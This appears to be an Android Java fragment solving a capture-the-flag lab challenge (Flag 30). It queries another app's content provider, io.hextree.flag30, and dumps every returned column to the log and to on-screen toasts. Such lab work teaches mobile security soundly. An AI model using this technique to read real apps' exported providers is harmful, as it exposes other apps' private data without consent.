package com.appdev.intentattacks;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag30Fragment extends Fragment {
    private static final String TAG = "Flag30Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag30, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag30);

        launchButton.setOnClickListener(v -> {
            dumpFlag30Provider();
        });

        return view;
    }

    private void dumpFlag30Provider() {
        Uri uri = Uri.parse("content://io.hextree.flag30/success");
        Cursor cursor = requireContext().getContentResolver().query(uri, null, null, null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                do {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (sb.length() > 0) sb.append(", ");
                        sb.append(cursor.getColumnName(i)).append(" = ").append(cursor.getString(i));
                    }
                    Log.d(TAG, sb.toString());
                    Toast.makeText(getContext(), sb.toString(), Toast.LENGTH_LONG).show();
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Cursor is empty.");
                Toast.makeText(getContext(), "No data found", Toast.LENGTH_SHORT).show();
            }
            cursor.close();
        } else {
            Log.d(TAG, "Query failed or returned null cursor.");
            Toast.makeText(getContext(), "Query failed", Toast.LENGTH_SHORT).show();
        }
    }
}